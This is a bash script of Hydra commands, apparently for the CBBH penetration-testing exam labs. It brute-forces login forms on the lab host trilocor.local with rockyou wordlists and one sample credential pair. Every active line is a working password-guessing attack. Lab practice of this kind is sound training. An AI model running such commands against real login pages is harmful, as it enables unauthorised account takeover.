#!/bin/bash

#CBBH exam PR
#export HYDRA_PROXY_HTTP=http://127.0.0.1:8082
hydra -v -l pr-martins -P ~/bin/pen/myWordLists/Password/rockyou.txt trilocor.local -s 8009 http-post-form "/auth/login:username=^USER^&password=^PASS^:F=Invalid username or password"
exit 0

#hydra -L userlist.txt -P passlist.txt example.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
#export HYDRA_PROXY_HTTP=http://127.0.0.1:8083

#CBBH exam Shop
#export HYDRA_PROXY_HTTP=http://127.0.0.1:8084
#hydra -v -l administrator -P ~/bin/pen/myWordLists/Password/rockyou-75.txt trilocor.local -s 9000 http-post-form "/api/login:username=^USER^&password=^PASS^:F=Invalid+username+or+password:S=200"
#hydra -v -l administrator -P ~/bin/pen/myWordLists/Password/rockyou-75.txt trilocor.local -s 9000 http-post-form "/api/login:username=^USER^&password=^PASS^:F=Location\: /login\?error=Invalid+username+or+password"
hydra -l administrator -P ~/bin/pen/myWordLists/Password/rockyou-75.txt trilocor.local -s 9000 http-post-form "/api/login:username=^USER^&password=^PASS^:S=Location\: /dashboard"
#hydra -v -I -l shopuser1 -p heslo1d trilocor.local -s 9000 http-post-form "/api/login:username=^USER^&password=^PASS^:S=Location\: /dashboard"

exit 0 

#CBBH exam
#Jobs portal
hydra -v -l r.batty -P ~/bin/pen/myWordLists/Password/rockyou.txt trilocor.local -s 8080 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid credentials"

